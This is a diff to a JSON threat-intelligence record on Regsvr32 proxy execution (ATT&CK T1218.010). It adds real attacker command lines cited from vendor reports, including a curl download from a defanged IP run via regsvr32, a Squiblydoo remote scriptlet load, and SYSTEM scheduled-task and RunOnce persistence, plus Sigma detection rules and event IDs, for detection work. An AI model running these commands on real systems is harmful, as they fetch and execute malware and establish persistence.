+        "intent": "After copying itself over SMB to a remote host, HermeticWizard starts the copy with regsvr32 and then clears the System event log.",
+        "status": "verified",
+        "source_name": "ESET HermeticWizard March 2022",
+        "source_url": "https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine"
+      },
+      {
+        "command": "%windir%\\System32\\cmd.exe /c %windir%\\system32\\curl -s -o %temp%\\goAlso.rtf http[:]//146[.]70[.]79[.]52/fromMakeTell.dat&&%windir%\\system32\\regsvr32 %temp%\\goAlso.rtf",
+        "intent": "LNK file command that downloads the Qbot DLL as goAlso.rtf and runs it with regsvr32.",
+        "status": "verified",
+        "source_name": "Deep Instinct Black Basta August 2022",
+        "source_url": "https://www.deepinstinct.com/blog/black-basta-ransomware-threat-emergence"
+      },
+      {
+        "command": "regsvr32 /S “%binpath%\\VboxC.dll”",
+        "intent": "install.bat registers the VirtualBox extension VBoxC.dll before the ransomware runs inside the virtual machine.",
+        "status": "verified",
+        "source_name": "Sophos Ragnar Locker May 2020",
+        "source_url": "https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/"
+      },
+      {
+        "command": "wmic.exe process call create 'regsvr32 -s C:\\Users\\Public\\microsoft.security'",
+        "intent": "The malicious Excel file ran the dropped file C:\\Users\\Public\\microsoft.security with regsvr32, which downloaded the IcedID malware.",
+        "status": "verified",
+        "source_name": "The DFIR Report IcedID Excel March 2021",
+        "source_url": "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/"
+      },
+      {
+        "command": "RUNDLL32.EXE SHELL32.DLL,ShellExec_RunDLL REGSVR32.EXE -U /s \"C:\\Windows\\Temp\\wcdp.etl.\"",
+        "intent": "RunOnce value that Roshtyak sets for persistence, running its DLL through regsvr32 in silent mode.",
+        "status": "verified",
+        "source_name": "Avast Raspberry Robin Roshtyak 2022",
+        "source_url": "https://decoded.avast.io/janvojtesek/raspberry-robins-roshtyak-a-little-lesson-in-trickery/"
+      },
+      {
+        "command": "regsvr32 $p\\t.A",
+        "intent": "Decoded Follina PowerShell payload downloads Qbot DLLs to the Temp directory and executes each with regsvr32 (same pattern for t1.A and t2.A).",
+        "status": "verified",
+        "source_name": "The DFIR Report Follina to Qbot October 2022",
+        "source_url": "https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/"
+      },
+      {
+        "command": "\"schtasks.exe\" /Create /RU \"NT AUTHORITY\\SYSTEM\" /tn juqpxmakfk /tr \"regsvr32.exe -s \\\"C:\\Users\\REDACTED\\ocrafh.html\\\"\" /SC ONCE /Z /ST 14:20 /ET 14:32",
+        "intent": "Qbot created a one-time scheduled task running as SYSTEM that executes regsvr32 on its DLL to escalate privileges.",
+        "status": "verified",
+        "source_name": "The DFIR Report Qbot Likes to Move It February 2022",
+        "source_url": "https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/"
+      },
+      {
+        "command": "regsvr32 /s /n /u /i:hxxp://support.chatconnecting(.)com:80/pic.png scrobj.dll",
+        "intent": "Download COM scriptlets with regsvr32 (Squiblydoo) as part of the fileless payload delivery.",
+        "status": "verified",
+        "source_name": "Cybereason Cobalt Kitty 2017",
+        "source_url": "https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf"
+      },
+      {
+        "command": "regsvr32.exe -s [filename]",
+        "intent": "Run the Valak DLL saved to C:\\ProgramData\\ after macros were enabled (the report prints [filename] as a placeholder).",
+        "status": "verified",
+        "source_name": "Unit 42 Valak Evolution July 2020",
+        "source_url": "https://unit42.paloaltonetworks.com/valak-evolution/"
+      },
+      {
+        "command": "regsvr32.exe /s /i <path>",
+        "intent": "Start the HermeticWizard worm DLL (the report prints <path> as a placeholder).",
+        "status": "verified",
+        "source_name": "ESET HermeticWizard March 2022",
+        "source_url": "https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine"
+      },
+      {
+        "command": "regsvr32.exe /s <CURRENT_FILENAME>",
+        "intent": "Scheduled task named AhnlabUpdate that runs the backdoor DLL every minute (placeholder <CURRENT_FILENAME> as printed).",
+        "status": "verified",
+        "source_name": "Gen Digital Kimsuky HTTPTroy October 2025",
+        "source_url": "https://www.gendigital.com/blog/insights/research/dprk-kimsuky-lazarus-analysis"
+      }
+    ]
+  },
+  "detections": {
+    "eventsid": [
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4688,
+        "data_components": "Process Creation",
+        "techniques": "T1218.010"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 3,
+        "data_components": "Network Connection Creation",
+        "techniques": "T1218.010"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 7,
+        "data_components": "Module Load",
+        "techniques": "T1218.010"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 22,
+        "data_components": "Network Connection Creation",
+        "techniques": "T1218.010"
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "Potential APT-C-12 BlueMushroom DLL Load Activity Via Regsvr32",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2019/TA/APC-C-12/proc_creation_win_apt_aptc12_bluemushroom.yml"
+      },
+      {
+        "title": "Qakbot Regsvr32 Calc Pattern",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/Malware/Qakbot/proc_creation_win_malware_qakbot_regsvr32_calc_pattern.yml"
+      },
+      {
+        "title": "Regsvr32.EXE Calling of DllRegisterServer Export Function Implicitly",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_regsvr32_dllregisterserver_exec.yml"
+      },
+      {
+        "title": "DNS Query Request By Regsvr32.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/dns_query/dns_query_win_regsvr32_dns_query.yml"
+      },
+      {
+        "title": "Network Connection Initiated By Regsvr32.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml"
+      },
+      {
+        "title": "Potential Regsvr32 Commandline Flag Anomaly",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_regsvr32_flags_anomaly.yml"
+      },
+      {
+        "title": "Potentially Suspicious Regsvr32 HTTP IP Pattern",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_regsvr32_http_ip_pattern.yml"
+      },
+      {
+        "title": "Potentially Suspicious Regsvr32 HTTP/FTP Pattern",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml"
+      },
+      {
+        "title": "Suspicious Regsvr32 Execution From Remote Share",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_regsvr32_remote_share.yml"
+      },
+      {
+        "title": "Regsvr32 Execution From Potential Suspicious Location",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_regsvr32_susp_exec_path_1.yml"
+      },
+      {
+        "title": "Regsvr32 Execution From Highly Suspicious Location",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_regsvr32_susp_exec_path_2.yml"
+      },
+      {
+        "title": "Regsvr32 DLL Execution With Suspicious File Extension",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_regsvr32_susp_extensions.yml"
+      },
+      {
+        "title": "Scripting/CommandLine Process Spawned Regsvr32",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml"
+      },
+      {
+        "title": "Regsvr32 DLL Execution With Uncommon Extension",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_regsvr32_uncommon_extension.yml"
+      }
+    ],
+    "related_sigma_rules": 84,
+    "other_rules": [
+      "https://github.com/splunk/security_content/blob/develop/detections/endpoint/regsvr32_with_known_silent_switch_cmdline.yml",
+      "https://github.com/splunk/security_content/blob/develop/detections/endpoint/detect_regsvr32_application_control_bypass.yml"
+    ]
+  },
   "related_CVE": [],
   "mitigations": [
-    "Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block regsvr32.exe from being used to bypass application control. (Citation: Secure Host Baseline EMET) Identify and block potentially malicious software executed through regsvr32 functionality by using application control (Citation: Beechey 2010) tools, like Windows Defender Application Control(Citation: Microsoft Windows Defender Application Control), AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"
+    {
+      "id": "M1050",
+      "name": "Exploit Protection",
+      "technique": "T1218.010"
+    }
   ],
+  "additional_mitigations": [],
   "references": [
     "https://attack.mitre.org/techniques/T1218/010/",
     "https://strontic.github.io/xcyclopedia/library/regsvr32.exe-0C9318BBE9A07725154ACE027ACF7655.html",
     "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/",
     "https://app.tidalcyber.com/technique/b1da2b02-9ade-45e0-a795-ec1b19e5316a"
-  ]
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
 }
